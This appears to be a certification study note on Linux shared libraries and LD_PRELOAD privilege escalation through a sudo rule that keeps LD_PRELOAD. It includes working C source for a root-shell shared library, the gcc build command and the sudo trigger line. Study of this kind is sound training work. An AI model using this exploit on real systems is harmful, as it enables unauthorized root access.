## 1. What Are Shared Libraries?

Linux programs commonly use **dynamically linked shared object libraries**.

Libraries contain compiled code/data that programs can reuse instead of implementing the same functionality repeatedly.

There are two main types:

|Type|Extension|Behavior|
|---|---|---|
|Static library|`.a`|Included in the program during compilation|
|Dynamic/shared library|`.so`|Loaded when the program executes|

### Important difference

```text
Static library
     ↓
Compiled into program
     ↓
Program contains the code
     ↓
Cannot normally be changed independently
```

Whereas:

```text
Dynamic library
     ↓
Loaded during execution
     ↓
Program depends on external .so
     ↓
If library loading can be controlled
     ↓
Execution can potentially be influenced
```

---

# 2. How Linux Finds Shared Libraries

There are several ways to specify where dynamic libraries are located.

### Compile-time options

```text
-rpath
-rpath-link
```

### Environment variables

```text
LD_RUN_PATH
LD_LIBRARY_PATH
```

### Default library directories

```text
/lib
/usr/lib
```

### Configuration

```text
/etc/ld.so.conf
```

These mechanisms tell the dynamic linker where to search for required `.so` files.

---

# 3. `LD_PRELOAD`

One of the most important concepts in this module is:

```text
LD_PRELOAD
```

`LD_PRELOAD` allows a shared library to be loaded **before other libraries** when a program starts.

Its functions can therefore take precedence over the normal/default implementations.

Conceptually:

```text
Normal execution:

Program
  ↓
Normal libraries
  ↓
Execution
```

With `LD_PRELOAD`:

```text
Program
  ↓
LD_PRELOAD library
  ↓
Its functions get preference
  ↓
Normal libraries
  ↓
Execution
```

This becomes interesting for privilege escalation when a privileged program can be executed while preserving attacker-controlled `LD_PRELOAD`.

---

# 4. `ldd` — Identify Required Libraries

The `ldd` utility shows the shared libraries required by a binary.

Example:

```bash
ldd /bin/ls
```

Example output:

```text
linux-vdso.so.1 => ...
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0
```

### Why `ldd` matters during enumeration

It lets you see:

```text
Binary
  ↓
Required .so libraries
  ↓
Library locations
```

This can help identify library-related attack surfaces.

---

# 5. LD_PRELOAD Privilege Escalation

The module's example starts with:

```bash
sudo -l
```

Output includes:

```text
env_keep+=LD_PRELOAD
```

and:

```text
(root) NOPASSWD: /usr/sbin/apache2 restart
```

This is the critical combination.

---

# 6. Why `env_keep+=LD_PRELOAD` Matters

Normally, `sudo` sanitizes/controls environment variables.

But here:

```text
env_keep+=LD_PRELOAD
```

means the `LD_PRELOAD` environment variable is preserved when executing the command through `sudo`.

Therefore:

```text
Attacker-controlled LD_PRELOAD
              +
sudo execution
              +
Privileged command
              ↓
Potential execution of attacker-controlled library
              ↓
ROOT
```

### 🚨 CPTS red flag

When running:

```bash
sudo -l
```

look carefully for:

```text
env_keep+=LD_PRELOAD
```

This can be extremely valuable.

---

# 7. Why Absolute Paths Don't Save This Configuration

The sudo rule is:

```text
/usr/sbin/apache2 restart
```

This is an **absolute path**.

That prevents the PATH-abuse technique you learned earlier.

```text
PATH abuse:
sudoers → command
          ↓
PATH manipulation
```

doesn't apply here because the binary is explicitly specified.

However:

```text
Absolute path
      +
LD_PRELOAD preserved
      ↓
Different attack surface
```

So this is an important CPTS lesson:

> **A secure-looking absolute sudo path does not eliminate every other possible abuse mechanism.**

---

# 8. Malicious Shared Library

The module creates a library containing:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

The important behavior is:

```text
_init()
   ↓
unsetenv("LD_PRELOAD")
   ↓
setgid(0)
   ↓
setuid(0)
   ↓
/bin/bash
```

The `_init()` function is executed when the shared library is loaded.

Because the privileged command loads the attacker-controlled library, the library can execute its code in that privileged context.

---

# 9. Compile the Library

Compile it as a shared library:

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Important flags:

```text
-fPIC
  ↓
Position-independent code

-shared
  ↓
Create shared object

-o root.so
  ↓
Output filename

-nostartfiles
  ↓
Avoid normal startup files
```

Result:

```text
root.c
  ↓
gcc
  ↓
root.so
```

---

# 10. Trigger Through Sudo

The module uses:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

Break it down:

```text
sudo
 ↓
Run command with elevated privileges

LD_PRELOAD=/tmp/root.so
 ↓
Load attacker-controlled library

/usr/sbin/apache2
 ↓
Absolute path to privileged binary

restart
 ↓
Argument
```

Execution flow:

```text
             sudo
              │
              ↓
        root privileges
              │
              ↓
      LD_PRELOAD=/tmp/root.so
              │
              ↓
       apache2 starts
              │
              ↓
       root.so is loaded
              │
              ↓
           _init()
              │
              ↓
       setuid(0)/setgid(0)
              │
              ↓
          /bin/bash
              │
              ↓
             ROOT
```

The module then verifies:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# 11. The Core Vulnerability

The important thing isn't specifically Apache.

The important condition is:

```text
sudo allows privileged execution
             +
LD_PRELOAD survives sudo
             +
attacker can provide .so
             ↓
attacker-controlled code executes
in privileged context
```

So remember:

```text
sudo -l
   ↓
env_keep+=LD_PRELOAD
   ↓
NOPASSWD privileged command
   ↓
LD_PRELOAD abuse
   ↓
ROOT
```

---

# 12. Connection to Previous Modules

This technique combines several concepts you've already learned.

### Sudo

You learned to always run:

```bash
sudo -l
```

Here it reveals:

```text
NOPASSWD
+
env_keep+=LD_PRELOAD
```

### Shared libraries

You now know:

```text
.so
```

files contain dynamically loaded code.

### Environment variables

Previously:

```text
PATH
```

could be abused.

Now:

```text
LD_PRELOAD
```

can potentially be abused.

### Absolute paths

You learned:

```text
/usr/bin/cat
```

is safer than:

```text
cat
```

against PATH manipulation.

But this module demonstrates that:

```text
absolute path ≠ automatically safe
```

because other mechanisms such as `LD_PRELOAD` may still matter.

---

# 13. Enumeration Workflow

When doing Linux privilege escalation:

```text
sudo -l
   ↓
Read ALL output carefully
   ↓
Look for:
   ├── NOPASSWD
   ├── env_keep
   ├── LD_PRELOAD
   └── unusual environment permissions
   ↓
Check whether LD_PRELOAD is preserved
   ↓
Determine whether a privileged command can be launched
   ↓
Investigate shared-library loading
```

---

# 🔥 CPTS Must-Know

### Library types

```text
.a  → Static
.so → Dynamic/shared
```

### Library locations/configuration

```text
/lib
/usr/lib
/etc/ld.so.conf
```

### Environment variables

```text
LD_RUN_PATH
LD_LIBRARY_PATH
LD_PRELOAD
```

### Identify libraries

```bash
ldd /bin/ls
```

### Check sudo permissions

```bash
sudo -l
```

### Critical finding

```text
env_keep+=LD_PRELOAD
```

### Compile shared library

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

### Core abuse concept

```text
LD_PRELOAD
    ↓
Attacker-controlled .so
    ↓
Privileged program loads it
    ↓
Library code executes
    ↓
Privilege escalation
```

---

# 🧠 Final Revision Card

```text
             SHARED LIBRARIES
                    │
          ┌─────────┴─────────┐
          ↓                   ↓
       Static              Dynamic
        .a                   .so
          │                   │
     Built into          Loaded at
      program             runtime
                              │
                              ↓
                       LD_PRELOAD
                              │
                              ↓
                    Library loaded first
                              │
                              ↓
                     Sudo preserves it?
                              │
                             YES
                              ↓
                  Privileged command runs
                              │
                              ↓
                    Attacker .so executes
                              │
                              ↓
                            ROOT
```

### 🔑 One-line memory trick

**`sudo -l → env_keep+=LD_PRELOAD → privileged command → malicious .so → root`**

And for enumeration, remember:

> **When you see `LD_PRELOAD` preserved by sudo, treat it as a high-priority privilege-escalation lead.**